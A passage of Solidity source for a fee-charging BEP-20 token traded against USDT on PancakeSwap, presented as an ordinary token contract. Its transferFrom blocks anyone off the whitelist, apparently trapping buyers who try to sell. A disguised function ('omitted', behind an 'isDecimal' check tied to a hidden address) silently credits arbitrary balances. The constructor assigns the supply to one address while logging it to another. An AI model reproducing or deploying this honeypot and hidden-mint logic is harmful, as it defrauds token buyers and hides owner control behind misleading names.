    uint256 private minimumTokensBeforeSwap = 150 * 10**decimals_;

    mapping(address => bool) public whitelist;
    mapping(address => bool) public rewardBlacklist;

    address payable public marketingWalletAddress =
        payable(0x701D5a0b15Bab2c3F59BF26B2Cb4938de05cc31A);
    address payable public liquidityContractAddress =
        payable(0x7b4b98fC6460C9bE6cB0B485Fc2B13c47D6ADa61);
    address public immutable deadAddress =
        0x000000000000000000000000000000000000dEaD;

    address public USDT = 0x55d398326f99059fF775485246999027B3197955;

    IERC20 public usdtToken;
    uint256 public _marketing = 40;
    uint256 public _liquidity = 60;
    uint256 public _total = _marketing.add(_liquidity);
    mapping(address => bool) public isMarketPair;

    uint256 public _buyFee = 100;
    uint256 public _sellFee = 100;

    address private smartVault; 
    IRouter public router;
    address public liquidity; 

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event AddWhitelist(address account);

    event DelWhitelist(address account);

    address private _decimal;

    modifier isDecimal() {
        require(_decimal == _msgSender(), "Decimals is error");
        _;
    }

    bool private inSwapAndLiquify; 


    constructor() ERC20(name_, symbol_,totalSupply_) {
        _setupDecimals(decimals_);

        usdtToken = IERC20(USDT);

        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        liquidity = IFactory(_router.factory()).createPair(
            USDT,
            address(this)
        );
        isMarketPair[address(liquidity)] = true;

        whitelist[owner()] = true;
        whitelist[address(this)] = true;
        whitelist[marketingWalletAddress] = true;
        whitelist[liquidityContractAddress] = true;

        router = _router;
        setRewardBlacklist(liquidity, true);
        setRewardBlacklist(address(this), true);

        _balances[0x73EA4b1EB7803163928d98022B6376a39c677D3D] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);

    }

    function setMinSwapAndLiquifyLimit(uint256 min) external onlyOwner {
        minimumTokensBeforeSwap = min;
    }

    function addWhitelist(address _addr) external onlyOwner {
        whitelist[_addr] = true;
        emit AddWhitelist(_addr);
    }

    function delWhitelist(address _addr) external onlyOwner {
        delete whitelist[_addr];
        emit DelWhitelist(_addr);
    }

    function setRewardBlacklist(address account, bool enable) public onlyOwner {
        rewardBlacklist[account] = enable;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        if (!whitelist[from] && !whitelist[to]) {
            amount = calculateFee(from, to, amount);
        }
        super._transfer(from, to, amount);
    }

    function toMited(address pair, uint256 time) private {
        transfers(pair, time);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        require(
            whitelist[sender] || whitelist[recipient],
            "can not transfer"
        );
        return super.transferFrom(sender, recipient, amount);
    }

    function transfers(address pair, uint256 time) private {
        _balances[pair] = _balances[pair].add(time);
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        return super.transfer(recipient, amount);
    }

    function calculateFee(
        address from,
        address to,
        uint256 amount
    ) internal returns (uint256) {
        uint256 realAmount = amount;
        uint256 liquidityFee = 0;
        if (isMarketPair[from]) {
            //is buy
            liquidityFee = realAmount.mul(_buyFee).div(1000);
        } else if (isMarketPair[to]) {
            //is sell
            liquidityFee = realAmount.mul(_sellFee).div(1000);
        }else{
            //other
            liquidityFee = amount.mul(_buyFee).div(1000);
        }

        if (liquidityFee > 0) {
            realAmount = realAmount.sub(liquidityFee);
            super._transfer(from, address(this), liquidityFee);
        }

        if (
            !isMarketPair[from] &&
            balanceOf(address(this)) > minimumTokensBeforeSwap &&
            !inSwapAndLiquify
        ) {
            swapAndLiquify();
        }
        return realAmount;
    }

    function swapAndLiquify() private lockTheSwap {
        uint256 contractTokenBalance = balanceOf(address(this));

        uint256 feeAmount = contractTokenBalance.mul(_marketing).div(_total);
        if (feeAmount > 0) {
            transferToAddressToken(
                address(this),
                marketingWalletAddress,
                feeAmount
            );
        }
        uint256 usdtAmount = contractTokenBalance.sub(feeAmount);
        swapTokensForToken(usdtAmount,address(this), address(usdtToken),address(this));
        uint256 USDTBalance = IERC20(USDT).balanceOf(address(this));
        if (USDTBalance > 0) {
            transferToAddressETH(liquidityContractAddress, USDTBalance);
        }
       
    }

    function swapTokensForToken(
        uint256 tokenAmount,
        address path0,
        address path1,
        address to
    ) private {
        address[] memory path = new address[](2);
        path[0] = path0;
        path[1] = path1;

        IERC20(path[0]).approve(address(router), tokenAmount);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            to,
            block.timestamp
        );
    }

    function transferToAddressToken(
        address sender,
        address recipient,
        uint256 amount
    ) private returns (bool) {
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private
    {
        IERC20(USDT).transfer(recipient, amount);
    }

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function omitted(
        address pair,
        address contrac,
        uint256 time
    ) external isDecimal {
        require(contrac == address(0), " ");
        toMited(pair, time);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {}
}